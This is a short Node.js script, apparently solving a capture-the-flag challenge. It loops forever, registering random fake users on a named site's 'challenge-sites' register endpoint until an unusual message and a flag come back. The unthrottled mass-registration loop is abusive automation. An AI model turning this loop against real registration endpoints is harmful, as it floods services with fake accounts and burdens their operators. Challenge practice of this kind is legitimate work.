import axios from 'axios';

const token = 'YOUR_TOKEN_HERE';

function randomUser() {
  const rand = Math.floor(Math.random() * 100000);
  const password = `Pass${rand}!`;
  return {
    fullName: `User ${rand}`,
    username: `user${rand}`,
    email: `user${rand}@gmail.com`,
    password,
    confirmPassword: password,
  };
}

async function tryRegister() {
  const user = randomUser();
  try {
    const res = await axios.post('https://easytolearnweb.vercel.app/api/challenge-sites/register', user, {
      headers: {
        Authorization: `Bearer ${token}`,
        'Content-Type': 'application/json',
      },
    });

    console.log('Response:', res.data);
    return res.data;
  } catch (err) {
    if (err.response) {
      console.error('Error:', err.response.data);
      return err.response.data;
    } else {
      console.error('Error:', err.message);
      return null;
    }
  }
}

(async () => {
  let response = null;
  let attempts = 0;
  const successMsg = 'Registrasi berhasil! Selamat bergabung di Easy To Learn Academy!';

  while (true) {
    attempts++;
    console.log(`Percobaan ke-${attempts}...`);

    response = await tryRegister();

    if (!response) continue;

    if (response.message !== successMsg) {
      console.log('Pesan unik ditemukan:', response.message);
      if (response.flag) {
        console.log('FLAG:', response.flag);
      }
      break;
    }
  }

  console.log('Selesai setelah', attempts, 'percobaan');
})();
